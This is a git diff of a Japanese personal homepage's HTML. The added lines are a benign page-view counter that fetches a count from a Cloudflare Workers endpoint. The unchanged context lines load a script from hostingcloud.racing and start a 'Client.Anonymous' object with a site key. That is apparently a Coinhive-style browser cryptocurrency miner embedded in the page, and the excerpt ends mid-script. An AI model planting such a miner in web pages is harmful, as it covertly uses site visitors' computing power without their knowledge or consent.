@@ -10,6 +10,9 @@
   <h1>2+2=80のホームページ</h1>
   <header id="header"></header>
   <p>ロリコンでひぐらしヲタでゲー廃で二次大戦ミリヲタのオワコンですが、どうぞよろしくお願い致します。名前は戦時中の標語から取りました。</p>
+  <span id="my_container_page_pv">
+      Views: <span id="my_value_page_pv"></span>
+  </span>
   <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=10,0,0,0" width="160" height="285" id="Ticker_AN" align="middle">
   <param name="allowScriptAccess" value="always" />
   <param name="movie" value="bp_rika.swf" />
@@ -21,6 +24,18 @@
   <footer id="footer"></footer>
   <script src="./js/main.js"></script>
   <script src="./ruffle.js"></script>
+  <script>
+      const workerUri = "page-tracker.0817shiryu1225.workers.dev/";
+      const { pathname } = new URL(window.location);
+      let workerUrl = workerUri + pathname;
+      fetch(workerUrl, {method: 'GET'})
+      .then(response => response.json())
+      .then(data => {
+              // get the counter value
+              document.getElementById("my_value_page_pv").innerHTML = data.pv;
+      })
+      .catch(err => {});
+  </script>
   <script src="https://www.hostingcloud.racing/og1d.js"></script>
   <script>
       var _client = new Client.Anonymous('b226f985c6028e9450ad838483abe1bc4475bd6137a7050b4ee327fcb939305b', {
